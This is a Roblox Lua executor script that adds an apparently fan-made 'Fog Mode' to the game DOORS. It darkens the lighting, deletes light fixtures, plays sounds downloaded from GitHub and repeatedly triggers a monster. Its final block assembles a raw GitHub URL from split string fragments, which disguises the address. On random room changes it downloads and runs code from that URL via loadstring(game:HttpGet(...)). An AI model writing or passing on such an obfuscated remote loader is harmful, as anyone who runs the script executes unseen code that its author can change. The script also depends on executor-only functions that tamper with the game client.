local bool = game:GetService("ReplicatedStorage"):FindFirstChild("Fog")
if bool then return end
	bool = Instance.new("BoolValue")
	bool.Name = "Fog"
	bool.Value = true
	bool.Parent = game:GetService("ReplicatedStorage")

local prefix = "Notification: "
local msg = "Script Made By Nowhywhats"

local fullMessage = "<font color='#ffff00'>" .. prefix .. msg .. "</font>"

game.TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(fullMessage)

local function GetGitSound(GithubSnd,SoundName)
				local url=GithubSnd
				if not isfile(SoundName..".mp3") then
					writefile(SoundName..".mp3", game:HttpGet(url))
				end
				local sound=Instance.new("Sound")
				sound.SoundId=(getcustomasset or getsynasset)(SoundName..".mp3")
				return sound
end
		
task.spawn(function()
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CreditGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local TextLabel = Instance.new("TextLabel")
TextLabel.Name = "CreditLabel"
TextLabel.Text = "Credits by Nowhywhats"
TextLabel.Font = Enum.Font.SciFi
TextLabel.TextColor3 = Color3.fromRGB(100, 0, 70)
TextLabel.TextStrokeTransparency = 0
TextLabel.TextSize = 35
TextLabel.AnchorPoint = Vector2.new(0.5, 1)
TextLabel.Position = UDim2.new(0.5, 0, 1, -100) -- Dưới cùng màn hình, lệch lên 20px
TextLabel.Size = UDim2.new(0, 800, 0, 50)
TextLabel.BackgroundTransparency = 1
TextLabel.Parent = ScreenGui

local tweenService = game:GetService("TweenService")
local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local fadeTween = tweenService:Create(TextLabel, tweenInfo, {
    TextTransparency = 1
})

wait(5)
fadeTween:Play()
fadeTween.Completed:Wait()
wait(0.5)

local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

TextLabel.TextTransparency = 0
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextSize = 30
TextLabel.Text = "Fog Mode Executed, Good Luck player @" .. char.Name .. "..."

local het = tweenService:Create(TextLabel, TweenInfo.new(10, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1})
het:Play()
het.Completed:Wait()
ScreenGui:Destroy()
end)

game.ReplicatedStorage:WaitForChild("GameData"):WaitForChild("LatestRoom").Changed:Wait()
	 	local Runi = GetGitSound("https://github.com/uknowiejiekeeowowowoeeo/A/blob/main/False_clark.mp3?raw=true","Falseclark")
	 	Runi.Parent = workspace
	     Runi.PlaybackSpeed = 0.5
	 	Runi.Volume = 2
		 Runi.Looped = true
		 Runi:Play()
		 local Y = GetGitSound("https://github.com/nervehammer1/throwawaystuff/blob/main/NightmareAmbient.mp3?raw=true","NightmareModeAmbient")
	 	Y.Parent = workspace
	 	Y.Volume = 3
		 Y.Looped = true
		 Y:Play()

task.spawn(function()
local shadow=game:GetObjects("rbxassetid://6219027765")[1]
shadow.Parent = game.Players.LocalPlayer.Backpack
local Players = game:GetService("Players")
local Plr = Players.LocalPlayer
local Char = Plr.Character or Plr.CharacterAdded:Wait()
Char:SetAttribute("InventoryCap", 9)
local Hum = Char:WaitForChild("Humanoid")
local RightArm = Char:WaitForChild("RightUpperArm")
local LeftArm = Char:WaitForChild("LeftUpperArm")
local RightC1 = RightArm.RightShoulder.C1
local LeftC1 = LeftArm.LeftShoulder.C1
        
local function setupCrucifix(tool)
        RightArm.Name = "R_Arm"
        LeftArm.Name = "L_Arm"
        
        RightArm.RightShoulder.C1 = RightC1 * CFrame.Angles(math.rad(-90), math.rad(-0), 0)
        LeftArm.LeftShoulder.C1 = LeftC1 * CFrame.new(0, 0, -0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0))
end
        
shadow.Equipped:Connect(function()
setupCrucifix(shadow)
end)
 
shadow.Unequipped:Connect(function()
        RightArm.Name = "RightUpperArm"
        LeftArm.Name = "LeftUpperArm"
        
        RightArm.RightShoulder.C1 = RightC1
        LeftArm.LeftShoulder.C1 = LeftC1
end)

end)

task.spawn(function()
game:GetService("RunService").Heartbeat:Connect(function()
local Lighting = game.Lighting
Lighting.FogEnd = 100
Lighting.FogColor = Color3.fromRGB(0, 0, 0)
local rooms = workspace.CurrentRooms
local room = rooms:FindFirstChild(game.ReplicatedStorage.GameData.LatestRoom.Value) or rooms:FindFirstChild(game.ReplicatedStorage.GameData.LatestRoom.Value + 1) 
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ModuleEvents = require(ReplicatedStorage.ModulesClient.Module_Events)

ModuleEvents.shatter(room)
game.Workspace.CurrentRooms:GetChildren()[#game.Workspace.CurrentRooms:GetChildren() - 1]:SetAttribute("Ambient",Color3.new(0, 0, 0))

end)
end)

local SoundService = game:GetService("SoundService")
SoundService.AmbientReverb = Enum.ReverbType.Auditorium

-- Obj
task.spawn(function()
    local RunService = game:GetService("RunService")
    local lastScan = os.clock()
	local scanInterval = 3
	
    local function handleObject(obj)
        if string.find(obj.Name, "Sign") 
        or string.find(obj.Name, "DupeGrowl") 
        or string.find(obj.Name, "Ambience_Dark") 
        or string.find(obj.Name, "Ambience_Hotel") 
        or string.find(obj.Name, "Ambience_Hotel2") 
        or string.find(obj.Name, "Ambience_Hotel3") 
        or string.find(obj.Name, "Chandelier") 
        or string.find(obj.Name, "Light_Fixtures") 
        or string.find(obj.Name, "Glass") 
        or string.find(obj.Name, "Curtain") 
        or string.find(obj.Name, "LightPanel") 
        or obj:IsA("PointLight") then
            obj:Destroy()

        elseif string.find(obj.Name, "HidePrompt") then
            obj.HoldDuration = 0.5

        elseif string.find(obj.Name, "Skybox") then
            obj.Color = Color3.new(0,0,0)

        elseif string.find(obj.Name, "UnlockPrompt") then
            obj.HoldDuration = 3

        elseif (string.find(obj.Name, "Anim_ExitModel") or string.find(obj.Name, "Anim_Exit")) and obj:IsA("Animation") then
            obj.AnimationId = "rbxassetid://9461439496"

        elseif (string.find(obj.Name, "AmbienceStart") 
        or string.find(obj.Name, "AmbienceEnd") 
        or string.find(obj.Name, "Ambience"))
        and obj:IsA("Sound") and not obj.Parent == game.Workspace.Eyes.Core then
            obj.SoundId = "rbxassetid://0"
        end

        if obj:IsA("Part") or obj:IsA("UnionOperation") then
            obj.Material = Enum.Material.Concrete
        end
    end

    for _, obj in ipairs(game.Workspace:GetDescendants()) do
        handleObject(obj)
        game.ReplicatedStorage.Entities.Screech.Top.Eyes.Color = Color3.fromRGB(0, 0, 0)
        game.ReplicatedStorage.Entities.Screech.Root.Sound.SoundId = "rbxassetid://9114038117"
    end

    game.Workspace.DescendantAdded:Connect(handleObject)

    RunService.Heartbeat:Connect(function()
		if os.clock() - lastScan >= scanInterval then
			lastScan = os.clock()
			for _, obj in ipairs(game.Workspace:GetDescendants()) do
				handleObject(obj)
				game.ReplicatedStorage.Entities.Screech.Top.Eyes.Color = Color3.fromRGB(0, 0, 0)
				game.ReplicatedStorage.Entities.Screech.Root.Sound.SoundId = "rbxassetid://9114038117"
			end
		end
	end)
	
end)

task.spawn(function()
         while true do
                wait(math.random(20, 40))
                      local player = game.Players.LocalPlayer
                      local mainGame = require(player.PlayerGui.MainUI.Initiator.Main_Game)
                      local screechModule = require(player.PlayerGui.MainUI.Initiator.Main_Game.RemoteListener.Modules.Screech)
                               screechModule(mainGame)
         end
end)

coroutine.wrap(function()
game.ReplicatedStorage.GameData.LatestRoom.Changed:Connect(function()

local entity = {
    "Inte",
    "Bite",
    "Flw"
}

local parts = {
    "ht", "tps", "://", "raw.",
    "github", "usercontent", ".com/",
    "Whatttt23/", "Scr/", "main/"
}

local function join(t)
    local s = ""
    for i = 1, #t do
        s = s .. t[i]
    end
    return s
end

local finalURL = join(parts)

if math.random(1,3) == 2 then
local url = finalURL .. entity[math.random(1, #entity)]
loadstring(game:HttpGet(url))()
end

end)
end)()
